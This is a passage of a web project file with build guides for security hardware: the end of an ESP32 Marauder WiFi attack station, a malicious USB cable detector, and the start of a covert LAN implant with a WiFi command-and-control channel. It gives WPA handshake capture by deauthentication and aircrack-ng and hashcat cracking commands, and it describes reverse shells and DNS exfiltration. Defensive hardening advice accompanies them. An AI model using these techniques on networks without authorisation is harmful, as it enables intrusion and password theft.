                '    ESP32-S3              TFT ST7735 (SPI)\n' +
                '    GPIO11 (MOSI) ------> SDA\n' +
                '    GPIO12 (SCK)  ------> SCK\n' +
                '    GPIO10 (CS)   ------> CS\n' +
                '    GPIO9  (DC)   ------> DC\n' +
                '    GPIO8  (RST)  ------> RES\n' +
                '    3V3           ------> VCC\n' +
                '    GND           ------> GND\n' +
                '\n' +
                '    ESP32-S3              MicroSD (SPI)\n' +
                '    GPIO11 (MOSI) ------> MOSI  (shared)\n' +
                '    GPIO13 (MISO) ------> MISO\n' +
                '    GPIO12 (SCK)  ------> SCK   (shared)\n' +
                '    GPIO7  (CS)   ------> CS\n' +
                '    3V3           ------> VCC\n' +
                '    GND           ------> GND\n' +
                '\n' +
                '    Buttons (to GND, internal pull-up):\n' +
                '    GPIO4 = UP    GPIO5 = DOWN    GPIO6 = SELECT\n' +
                '\n' +
                '    GPS NEO-6M (UART, optional):\n' +
                '    GPIO17 (TX) --> RX    GPIO16 (RX) --> TX\n' +
                '    3V3 --> VCC           GND --> GND',

        wiringNotes: '<p><strong>ESP32-S3 vs ESP32:</strong> The S3 variant has native USB, more GPIO pins, and better WiFi performance. It also supports USB-OTG, which means it can act as a USB host &mdash; useful for future expansion (connecting WiFi adapters for more channels).</p>' +
                     '<p><strong>GPS for wardriving:</strong> The NEO-6M GPS module adds location tagging to captured networks. Combined with a car charger and a suction-cup mount, this becomes a full wardriving rig. GPS coordinates are stored alongside PCAP data for mapping in tools like WiGLE.</p>',

        steps: [
            {
                title: 'Flash the Marauder Firmware',
                content: '<p>Rather than writing a WiFi audit tool from scratch, we use the open-source <strong>ESP32 Marauder</strong> firmware by JustCallMeKoko. It provides a complete WiFi/Bluetooth offensive toolkit with a polished GUI for TFT displays.</p>' +
                         '<p>Marauder capabilities include:</p>' +
                         '<ul>' +
                         '<li>WiFi scanning (AP and client enumeration)</li>' +
                         '<li>Deauthentication attacks</li>' +
                         '<li>Beacon spam (fake SSID flooding)</li>' +
                         '<li>Probe request sniffing</li>' +
                         '<li>PMKID/EAPOL handshake capture</li>' +
                         '<li>Evil portal (captive portal phishing)</li>' +
                         '<li>Bluetooth scanning and enumeration</li>' +
                         '<li>Packet capture to SD (PCAP format)</li>' +
                         '</ul>',
                code: '# Flash Marauder via the web flasher (easiest method):\n# 1. Visit: https://github.com/justcallmekoko/ESP32Marauder\n# 2. Download the latest release for your ESP32-S3 board\n# 3. Flash using esptool:\n\npip install esptool\n\n# Erase flash first\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 erase_flash\n\n# Flash the firmware\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 \\\n  --baud 921600 write_flash \\\n  0x0 ESP32Marauder_esp32s3.bin\n\n# Or use the Arduino IDE:\n# 1. Clone the Marauder repo\n# 2. Open esp32_marauder.ino\n# 3. Select ESP32-S3 Dev Module\n# 4. Set PSRAM: OPI, Flash: QIO 80MHz\n# 5. Upload',
                language: 'Bash',
                tip: '<strong>Tip:</strong> If you have a cheap ESP32 board (not S3), Marauder still works but with reduced features. Check the Marauder wiki for your specific board\'s compatibility matrix.'
            },
            {
                title: 'Configure the Display and Buttons',
                content: '<p>Marauder auto-detects common display configurations. If your display does not work out of the box, you may need to adjust the pin definitions in the source code before compiling.</p>' +
                         '<p>The three-button navigation works as follows:</p>' +
                         '<ul>' +
                         '<li><strong>UP:</strong> Move up in menus / scroll up in scan results</li>' +
                         '<li><strong>DOWN:</strong> Move down in menus / scroll down</li>' +
                         '<li><strong>SELECT:</strong> Choose the highlighted option / start action</li>' +
                         '</ul>',
                code: '// In the Marauder source, adjust these if your pins differ:\n// File: configs/MarauderConfig.h\n\n#define TFT_MOSI 11\n#define TFT_SCLK 12\n#define TFT_CS   10\n#define TFT_DC   9\n#define TFT_RST  8\n\n#define SD_CS    7\n\n#define BTN_UP   4\n#define BTN_DOWN 5\n#define BTN_SEL  6\n\n// GPS (optional)\n#define GPS_TX   17\n#define GPS_RX   16\n#define GPS_BAUD 9600',
                language: 'C++',
                tip: '<strong>Tip:</strong> If the display shows colors inverted or rotated, change <code>TFT_ROTATION</code> in the config. Common values: 0, 1, 2, 3 (each rotates 90 degrees).'
            },
            {
                title: 'Capture WPA Handshakes',
                content: '<p>The most practical offensive use is capturing WPA/WPA2 handshakes for offline password cracking. The process:</p>' +
                         '<ol>' +
                         '<li>Scan for target APs and note the channel.</li>' +
                         '<li>Start packet capture on the target channel.</li>' +
                         '<li>Send deauth frames to force clients to reconnect.</li>' +
                         '<li>The reconnection process includes the 4-way WPA handshake.</li>' +
                         '<li>The captured PCAP file contains the handshake for cracking.</li>' +
                         '</ol>',
                code: '# After capturing the handshake PCAP, crack it on your laptop:\n\n# Using aircrack-ng:\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture.pcap\n\n# Using hashcat (GPU-accelerated, much faster):\n# First convert PCAP to hashcat format:\nhcxpcapngtool -o hash.hc22000 capture.pcap\n\n# Then crack:\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n\n# For PMKID attacks (no client needed):\n# Marauder can capture PMKID from AP beacons directly.\n# This does not require deauthing any clients.\nhashcat -m 22000 pmkid.hc22000 wordlist.txt',
                language: 'Bash',
                tip: '<strong>PMKID attack:</strong> Some APs include the PMKID in the first message of the 4-way handshake. Marauder can capture this without deauthing anyone &mdash; a completely passive attack. Not all APs are vulnerable, but many are.'
            },
            {
                title: 'Defense: Comprehensive WiFi Security Hardening',
                content: '<p>This device combines every WiFi attack into one tool. Here is the comprehensive defense playbook:</p>' +
                         '<ul>' +
                         '<li><strong>WPA3-SAE:</strong> Upgrade to WPA3 wherever possible. SAE (Simultaneous Authentication of Equals) replaces the vulnerable 4-way handshake with a zero-knowledge proof. Captured handshakes cannot be cracked offline.</li>' +
                         '<li><strong>Strong passwords:</strong> If stuck on WPA2, use passwords 20+ characters long with mixed case, numbers, and symbols. This makes dictionary attacks infeasible.</li>' +
                         '<li><strong>Disable WPS:</strong> WPS (WiFi Protected Setup) has known vulnerabilities (Reaver attack). Disable it in your router settings.</li>' +
                         '<li><strong>802.11w PMF:</strong> Prevents deauthentication attacks (see SG-35 defense section).</li>' +
                         '<li><strong>WIDS/WIPS:</strong> Deploy wireless intrusion detection. Enterprise solutions (Cisco CleanAir, Aruba RFProtect) detect rogue APs, deauth floods, and evil twins.</li>' +
                         '<li><strong>Client isolation + VLAN segmentation:</strong> Separate IoT, guest, and corporate traffic onto different VLANs.</li>' +
                         '<li><strong>Rogue AP detection:</strong> Periodically scan for APs with your SSID that you did not deploy. Evil twin attacks rely on matching your SSID.</li>' +
                         '</ul>',
                code: null,
                language: null,
                tip: '<strong>Enterprise standard:</strong> A properly hardened wireless network uses WPA3-Enterprise (802.1X with RADIUS), 802.11w (PMF required), certificate-based authentication, and a WIDS. This combination defeats every attack this device can perform.'
            }
        ],

        testing: '<p>Verify your WiFi audit station works:</p>' +
                 '<ul>' +
                 '<li><strong>Display shows menu:</strong> Power on the device. The TFT should display the Marauder menu system. Navigate with buttons to verify all three work.</li>' +
                 '<li><strong>WiFi scan:</strong> Run a scan and verify it detects your own AP. Signal strength (RSSI) should match expectations for the distance.</li>' +
                 '<li><strong>SD card logging:</strong> Start a capture, wait 30 seconds, stop. Pull the SD card and verify PCAP files were created.</li>' +
                 '<li><strong>GPS (if installed):</strong> Take the device outside with a clear sky view. GPS should acquire a fix within 60 seconds. Coordinates should appear in the scan data.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'Wrong ESP32 Variant',
                description: 'ESP32, ESP32-S2, ESP32-S3, and ESP32-C3 are all different chips. Marauder firmware is chip-specific. Make sure you download the build matching your exact variant.'
            },
            {
                title: 'PSRAM Not Enabled',
                description: 'Some ESP32-S3 boards have PSRAM (extra RAM). If Marauder crashes with memory errors, enable PSRAM in Arduino IDE: Tools > PSRAM > OPI PSRAM.'
            }
        ]
    },

    // ========================================================================
    // SG-39: Malicious Cable Detector
    // ========================================================================
    'sg-39': {
        intro: '<p>Malicious USB cables look identical to normal charging cables but contain hidden electronics that can inject keystrokes, exfiltrate data, or provide remote access. The most famous example is the <strong>O.MG Cable</strong> (~$120-180), which embeds a WiFi-enabled microcontroller inside a standard USB connector.</p>' +
               '<p>This project builds a <strong>detector</strong> &mdash; a device that identifies whether a USB cable contains hidden electronics. It works by analyzing the electrical characteristics of the cable: a normal cable has simple wire connections, while a malicious cable has additional resistance, capacitance, and data line behavior caused by the embedded electronics.</p>' +
               '<p>We use a <strong>Raspberry Pi Pico</strong> with voltage measurement on the USB data lines (D+ and D-), current monitoring, and USB enumeration analysis. When you plug a suspect cable into the detector with a test device, it checks for anomalies that indicate embedded hardware.</p>' +
               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico, USB-A breakout board, 2 LEDs (red/green), resistors, breadboard. Total cost: ~$4.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="720" height="280" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="260" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">MALICIOUS CABLE DETECTOR &mdash; TEST FLOW</text>' +
            '<!-- Suspect cable -->' +
            '<rect x="40" y="70" width="160" height="70" rx="8" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.5)" stroke-width="1.5"/>' +
            '<text x="120" y="95" text-anchor="middle" fill="#eab308" font-size="10" font-weight="600">Suspect Cable</text>' +
            '<text x="120" y="115" text-anchor="middle" fill="#8b949e" font-size="7">Plug into USB-A breakout</text>' +
            '<text x="120" y="128" text-anchor="middle" fill="#555" font-size="7">Cable under test</text>' +
            '<!-- Arrow -->' +
            '<line x1="200" y1="105" x2="250" y2="105" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="250,101 258,105 250,109" fill="#eab308" opacity="0.6"/>' +
            '<!-- Pico detector -->' +
            '<rect x="260" y="55" width="200" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<text x="360" y="80" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">PICO DETECTOR</text>' +
            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="8">ADC reads D+ and D- voltage</text>' +
            '<text x="360" y="115" text-anchor="middle" fill="#8b949e" font-size="8">Checks USB enumeration</text>' +
            '<text x="360" y="130" text-anchor="middle" fill="#8b949e" font-size="8">Measures current draw</text>' +
            '<!-- Results -->' +
            '<rect x="520" y="55" width="160" height="45" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
            '<text x="600" y="75" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">GREEN = Safe</text>' +
            '<text x="600" y="90" text-anchor="middle" fill="#8b949e" font-size="7">Normal cable detected</text>' +
            '<rect x="520" y="110" width="160" height="45" rx="6" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
            '<text x="600" y="130" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">RED = Suspicious</text>' +
            '<text x="600" y="145" text-anchor="middle" fill="#8b949e" font-size="7">Electronics detected!</text>' +
            '<!-- Lines -->' +
            '<line x1="460" y1="80" x2="518" y2="78" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<line x1="460" y1="130" x2="518" y2="130" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<!-- Detection methods -->' +
            '<text x="360" y="195" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">DETECTION METHODS</text>' +
            '<rect x="60" y="210" width="150" height="40" rx="5" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
            '<text x="135" y="228" text-anchor="middle" fill="#3b82f6" font-size="8" font-weight="600">Voltage Analysis</text>' +
            '<text x="135" y="242" text-anchor="middle" fill="#555" font-size="6">D+/D- idle voltage</text>' +
            '<rect x="225" y="210" width="150" height="40" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="300" y="228" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="600">Current Draw</text>' +
            '<text x="300" y="242" text-anchor="middle" fill="#555" font-size="6">Normal: 0-100mA</text>' +
            '<rect x="390" y="210" width="150" height="40" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="465" y="228" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">USB Enumeration</text>' +
            '<text x="465" y="242" text-anchor="middle" fill="#555" font-size="6">HID = suspicious</text>' +
            '<rect x="555" y="210" width="120" height="40" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.2)" stroke-width="0.5"/>' +
            '<text x="615" y="228" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">WiFi Scan</text>' +
            '<text x="615" y="242" text-anchor="middle" fill="#555" font-size="6">O.MG AP detect</text>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    USB-A Breakout (suspect cable plugs in here)\n' +
                '    +--------------------------------------------------+\n' +
                '    |  VBUS (pin 1) --> Pico GP26 (ADC0) via voltage   |\n' +
                '    |                   divider (10k + 10k)            |\n' +
                '    |  D-   (pin 2) --> Pico GP27 (ADC1) via 10k      |\n' +
                '    |  D+   (pin 3) --> Pico GP28 (ADC2) via 10k      |\n' +
                '    |  GND  (pin 4) --> Pico GND                      |\n' +
                '    +--------------------------------------------------+\n' +
                '\n' +
                '    Status LEDs:\n' +
                '    GP12 ---[330ohm]--- GREEN LED --- GND  (safe)\n' +
                '    GP13 ---[330ohm]--- RED LED   --- GND  (suspicious)\n' +
                '\n' +
                '    NOTE: Voltage divider on VBUS is required.\n' +
                '    VBUS is 5V; Pico ADC only handles 3.3V max.',

        wiringNotes: '<p><strong>Voltage divider:</strong> The USB VBUS line is 5V, but the Pico\'s ADC inputs are 3.3V max. A 10k/10k voltage divider halves the voltage to 2.5V, safely within the ADC range. Without this divider, you will damage the Pico.</p>' +
                     '<p><strong>How detection works:</strong> A normal charging cable has 4 simple wire connections (VBUS, D-, D+, GND). A malicious cable has embedded electronics that draw current even when idle, show unusual voltage on the data lines, and may enumerate as a USB device (HID keyboard).</p>',

        steps: [
            {
                title: 'Build the Test Jig',
                content: '<p>Solder or breadboard the USB-A breakout with voltage dividers on the data lines and VBUS. This is your "cable under test" port. A suspect cable plugs into this breakout, and the other end plugs into a USB charger or power source.</p>' +
                         '<ol>' +
                         '<li>Place the USB-A female breakout on the breadboard.</li>' +
                         '<li>Wire the VBUS pin through a 10k/10k voltage divider to GP26.</li>' +
                         '<li>Wire D- through a 10k series resistor to GP27.</li>' +
                         '<li>Wire D+ through a 10k series resistor to GP28.</li>' +
                         '<li>Connect GND to Pico GND.</li>' +
                         '<li>Add green LED (GP12) and red LED (GP13) with 330-ohm resistors.</li>' +
                         '</ol>',
                code: null,
                language: null,
                tip: '<strong>Tip:</strong> Use a female USB-A breakout board so cables plug in naturally. You can find these on Amazon for ~$2 in a 5-pack. Alternatively, cut an old USB extension cable and solder the wires to the breadboard.'
            },
            {
                title: 'Write the Detection Firmware',
                content: '<p>The detector runs several checks in sequence and scores the cable. A high suspicion score triggers the red LED.</p>',
                code: 'import time\nimport board\nimport digitalio\nimport analogio\n\n# ADC inputs\nadc_vbus = analogio.AnalogIn(board.GP26)  # VBUS via divider\nadc_dminus = analogio.AnalogIn(board.GP27)  # D-\nadc_dplus = analogio.AnalogIn(board.GP28)   # D+\n\n# LEDs\nled_safe = digitalio.DigitalInOut(board.GP12)\nled_safe.direction = digitalio.Direction.OUTPUT\nled_warn = digitalio.DigitalInOut(board.GP13)\nled_warn.direction = digitalio.Direction.OUTPUT\n\ndef read_voltage(adc):\n    """Convert 16-bit ADC reading to voltage."""\n    return (adc.value / 65535) * 3.3\n\ndef check_cable():\n    """Run detection checks. Returns suspicion score 0-100."""\n    score = 0\n    results = []\n\n    # Test 1: VBUS voltage (should be ~2.5V via divider = 5V actual)\n    vbus = read_voltage(adc_vbus) * 2  # Account for divider\n    results.append(f"VBUS: {vbus:.2f}V")\n    if vbus < 4.5 or vbus > 5.5:\n        score += 20\n        results.append("  WARNING: Abnormal VBUS voltage")\n\n    # Test 2: Data line idle voltage\n    # Normal cable: D+/D- float near 0V when no device connected\n    # Malicious cable: embedded MCU may pull lines to specific voltages\n    dp = read_voltage(adc_dplus)\n    dm = read_voltage(adc_dminus)\n    results.append(f"D+: {dp:.3f}V  D-: {dm:.3f}V")\n\n    if dp > 0.4 or dm > 0.4:\n        score += 30\n        results.append("  WARNING: Data lines not floating (electronics present)")\n\n    # Test 3: Check for USB device enumeration\n    # A normal cable does not enumerate. A malicious cable with\n    # embedded MCU will attempt to enumerate as a device.\n    # (This check requires USB host capability - simplified here)\n    time.sleep(2)  # Wait for any enumeration attempt\n    dp_after = read_voltage(adc_dplus)\n    dm_after = read_voltage(adc_dminus)\n\n    if abs(dp_after - dp) > 0.2 or abs(dm_after - dm) > 0.2:\n        score += 30\n        results.append("  WARNING: Data line activity detected (device enumeration)")\n\n    # Test 4: Current draw measurement\n    # Normal cable: negligible current when no device at other end\n    # Malicious cable: embedded MCU draws 10-50mA\n    vbus_drop = 5.0 - (read_voltage(adc_vbus) * 2)\n    current_ma = vbus_drop / 0.1  # Rough estimate\n    results.append(f"Est. current: {current_ma:.1f}mA")\n\n    if current_ma > 5:\n        score += 20\n        results.append("  WARNING: Cable drawing current (embedded electronics)")\n\n    return score, results\n\n# Main loop\nprint("=== USB Cable Detector ===")\nprint("Plug suspect cable into test port...")\n\nwhile True:\n    led_safe.value = False\n    led_warn.value = False\n\n    score, results = check_cable()\n\n    print(f"\\nSuspicion score: {score}/100")\n    for r in results:\n        print(r)\n\n    if score >= 30:\n        led_warn.value = True\n        print("*** RED ALERT: Cable may be malicious! ***")\n    else:\n        led_safe.value = True\n        print("GREEN: Cable appears normal.")\n\n    time.sleep(3)',
                language: 'Python',
                tip: '<strong>Limitation:</strong> This detector catches basic malicious cables but sophisticated implants (like the O.MG cable) can power down their electronics until triggered, evading voltage-based detection. For those, you need X-ray inspection or RF scanning.'
            },
            {
                title: 'Add WiFi Scanning (O.MG Detection)',
                content: '<p>The O.MG cable creates a hidden WiFi access point for remote control. We can detect this by scanning for WiFi networks near the cable. Use a Pico W or add an ESP8266 to scan for APs that appear when the suspect cable is connected.</p>',
                code: '# On a Pico W or separate ESP, scan for WiFi APs:\n# O.MG cables broadcast an SSID (configurable, but default\n# patterns include random names or "O.MG" variants)\n\n# CircuitPython (Pico W):\nimport wifi\n\ndef scan_for_omg():\n    """Scan for WiFi APs that might be an O.MG cable."""\n    networks = wifi.radio.start_scanning_networks()\n    suspicious = []\n\n    for net in networks:\n        # O.MG cables have very strong signal when nearby\n        # (because the antenna is inches away)\n        if net.rssi > -30:  # Extremely strong = very close\n            suspicious.append(net)\n\n        # Check for known O.MG default SSIDs\n        ssid = net.ssid\n        if ssid.startswith("O.MG") or ssid == "" or len(ssid) < 3:\n            suspicious.append(net)\n\n    wifi.radio.stop_scanning_networks()\n    return suspicious\n\n# Run scan before and after connecting the suspect cable.\n# If a new AP appears, the cable likely has an embedded radio.\nbefore = scan_for_omg()\nprint("Connect suspect cable now...")\ntime.sleep(5)\nafter = scan_for_omg()\n\nnew_aps = [ap for ap in after if ap not in before]\nif new_aps:\n    print("NEW AP DETECTED - cable may contain radio!")\n    for ap in new_aps:\n        print(f"  SSID: {ap.ssid}  RSSI: {ap.rssi}")',
                language: 'Python',
                tip: '<strong>Advanced:</strong> O.MG cables can be configured with custom SSIDs and can be set to not broadcast. For complete detection, you would need to monitor for probe responses as well, or use an SDR to scan the 2.4GHz band for any transmission.'
            },
            {
                title: 'Defense: Protecting Against Malicious Cables',
                content: '<p>Malicious cables exploit the implicit trust we place in physical peripherals. Defend against them:</p>' +
                         '<ul>' +
                         '<li><strong>Only use cables you purchased:</strong> Never use a cable given to you by someone else, found at a conference, or left in a public space. This is the USB equivalent of a "found USB drive" attack.</li>' +
                         '<li><strong>USB data blockers:</strong> Use a USB data blocker ("USB condom") when charging from public USB ports. These devices physically disconnect the D+ and D- lines, allowing only power flow. They cost ~$5 and fit on a keychain.</li>' +
                         '<li><strong>Charge-only cables:</strong> Use verified charge-only cables (no data lines) for charging. Label them clearly.</li>' +
                         '<li><strong>Cable inspection:</strong> Malicious cables are slightly heavier and bulkier than normal cables, especially near the USB connector where the electronics are embedded. Compare to a known-good cable.</li>' +
                         '<li><strong>USB port policy:</strong> Disable USB data on machines that should not accept USB devices. On Linux: <code>echo 0 > /sys/bus/usb/devices/usb1/authorized_default</code></li>' +
                         '</ul>',
                code: '# Linux: Disable USB data on all ports (power only)\necho 0 | sudo tee /sys/bus/usb/devices/usb*/authorized_default\n\n# Re-enable:\necho 1 | sudo tee /sys/bus/usb/devices/usb*/authorized_default\n\n# Windows: Disable USB storage (Group Policy)\n# Computer Config > Admin Templates > System > Removable Storage Access\n# > All Removable Storage classes: Deny all access\n\n# Check for USB data blocker effectiveness:\n# Plug phone into USB port through data blocker.\n# Run: lsusb\n# The phone should NOT appear as a device.\n# Only power should flow.',
                language: 'Bash',
                tip: '<strong>Conference survival kit:</strong> Bring your own cables, your own charger, and a USB data blocker. Security conferences are ground zero for malicious USB distribution.'
            }
        ],

        testing: '<p>Verify your cable detector works:</p>' +
                 '<ul>' +
                 '<li><strong>Known-good cable:</strong> Test with a cable you purchased yourself. The green LED should light up and the suspicion score should be low (0-20).</li>' +
                 '<li><strong>Charge-only cable:</strong> Test with a charge-only cable (no data wires). Should show as safe with D+/D- at 0V.</li>' +
                 '<li><strong>Data cable with phone:</strong> Plug a phone through the cable under test. The detector should see data line activity (expected when a device is connected). This tests the enumeration detection.</li>' +
                 '<li><strong>Simulated malicious cable:</strong> If you have a Rubber Ducky Pico from SG-33, connect it through a cable to the detector. The red LED should trigger because the Ducky enumerates as a HID device and draws current.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'Missing Voltage Divider',
                description: 'VBUS is 5V. The Pico ADC maximum is 3.3V. Without the voltage divider, you will damage GP26. Always use the 10k/10k divider on the VBUS line.'
            },
            {
                title: 'False Positives',
                description: 'Some normal cables have ferrite beads, EMI filters, or USB-C negotiation chips that cause slightly elevated readings. Calibrate your thresholds with multiple known-good cables before testing suspect ones.'
            }
        ]
    },

    // ========================================================================
    // SG-40: LAN Implant Device
    // ========================================================================
    'sg-40': {
        intro: '<p>A LAN implant is a small device planted on a wired network that provides persistent remote access. The commercial version is the <strong>Hak5 LAN Turtle</strong> (~$60) or the <strong>Packet Squirrel</strong> &mdash; small devices that sit inline on an Ethernet connection, bridging traffic while simultaneously providing a covert reverse shell or VPN tunnel back to the attacker.</p>' +
               '<p>We build a similar device using a <strong>Raspberry Pi Pico W</strong> with a <strong>W5500 Ethernet module</strong>. The Pico W provides WiFi for command-and-control (C2) communications, while the W5500 connects to the target network via Ethernet. The device bridges the two interfaces, passing legitimate traffic while also exfiltrating data or providing remote access.</p>' +
               '<p>In a penetration test, this device is planted behind a desk, in a server closet, or anywhere with an available Ethernet port. It phones home over WiFi to your C2 server, giving you persistent network access even after you leave the building.</p>' +
               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico W, W5500 Ethernet module, MicroSD breakout (optional), USB power supply, jumper wires. Total cost: ~$15.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">LAN IMPLANT &mdash; NETWORK POSITION</text>' +
            '<!-- Corporate network -->' +
            '<rect x="40" y="60" width="140" height="70" rx="8" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
            '<text x="110" y="85" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">Target Network</text>' +
            '<text x="110" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Ethernet (RJ45)</text>' +
            '<text x="110" y="115" text-anchor="middle" fill="#555" font-size="7">10/100 Mbps</text>' +
            '<!-- Arrow -->' +
            '<line x1="180" y1="95" x2="240" y2="95" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="240,91 248,95 240,99" fill="#3b82f6" opacity="0.6"/>' +
            '<!-- Implant -->' +
            '<rect x="250" y="50" width="220" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="250" y="50" width="220" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="360" y="67" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">LAN IMPLANT (Pico W)</text>' +
            '<text x="360" y="90" text-anchor="middle" fill="#8b949e" font-size="8">W5500 = Wired network access</text>' +
            '<text x="360" y="105" text-anchor="middle" fill="#8b949e" font-size="8">Pico W WiFi = C2 channel</text>' +
            '<text x="360" y="120" text-anchor="middle" fill="#8b949e" font-size="8">Bridges traffic transparently</text>' +
            '<text x="360" y="137" text-anchor="middle" fill="#ef4444" font-size="7">Powered by USB (wall adapter)</text>' +
            '<!-- Arrow to C2 -->' +
            '<line x1="470" y1="95" x2="530" y2="95" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="530,91 538,95 530,99" fill="#dc2626" opacity="0.6"/>' +
            '<!-- C2 -->' +
            '<rect x="540" y="60" width="140" height="70" rx="8" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
            '<text x="610" y="85" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">C2 Server</text>' +
            '<text x="610" y="100" text-anchor="middle" fill="#8b949e" font-size="7">via WiFi (covert)</text>' +
            '<text x="610" y="115" text-anchor="middle" fill="#555" font-size="7">Reverse shell / VPN</text>' +
            '<!-- Use cases -->' +
            '<text x="360" y="190" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">IMPLANT CAPABILITIES</text>' +
            '<rect x="60" y="205" width="145" height="40" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.2)" stroke-width="0.5"/>' +
            '<text x="133" y="223" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">Network Recon</text>' +
            '<text x="133" y="237" text-anchor="middle" fill="#555" font-size="6">ARP scan, port scan</text>' +
            '<rect x="220" y="205" width="145" height="40" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="293" y="223" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">Packet Capture</text>' +
            '<text x="293" y="237" text-anchor="middle" fill="#555" font-size="6">Sniff local traffic</text>' +
            '<rect x="380" y="205" width="145" height="40" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="453" y="223" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="600">Reverse Shell</text>' +
            '<text x="453" y="237" text-anchor="middle" fill="#555" font-size="6">Remote access</text>' +
            '<rect x="540" y="205" width="135" height="40" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="608" y="223" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">DNS Exfil</text>' +
            '<text x="608" y="237" text-anchor="middle" fill="#555" font-size="6">Data over DNS</text>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    Raspberry Pi Pico W    W5500 Ethernet Module\n' +
                '    +------------------+  +------------------+\n' +
                '    |  GP19 (MOSI)   --|--|-- MOSI            |\n' +
                '    |  GP16 (MISO)   --|--|-- MISO            |\n' +
                '    |  GP18 (SCK)    --|--|-- SCLK            |\n' +
                '    |  GP17 (CS)     --|--|-- SCS             |\n' +
                '    |  GP20 (RST)    --|--|-- RST             |\n' +
                '    |  3V3           --|--|-- VCC             |\n' +
                '    |  GND           --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    Power: USB Micro-B from wall adapter (5V 1A)\n' +
                '    WiFi: Built-in on Pico W (2.4GHz)\n' +
                '    Ethernet: RJ45 on W5500 module',

        wiringNotes: '<p><strong>Pico W WiFi:</strong> The Pico W has built-in WiFi (CYW43439 chip), providing the C2 channel without any additional hardware. It connects to a nearby WiFi network (or your mobile hotspot) to phone home.</p>' +
                     '<p><strong>Power considerations:</strong> The implant needs continuous power. A USB wall adapter is the most inconspicuous option &mdash; it looks like a phone charger. In a server closet, USB power is often available from equipment or power strips.</p>',

        steps: [
            {
                title: 'Set Up the Pico W with MicroPython',
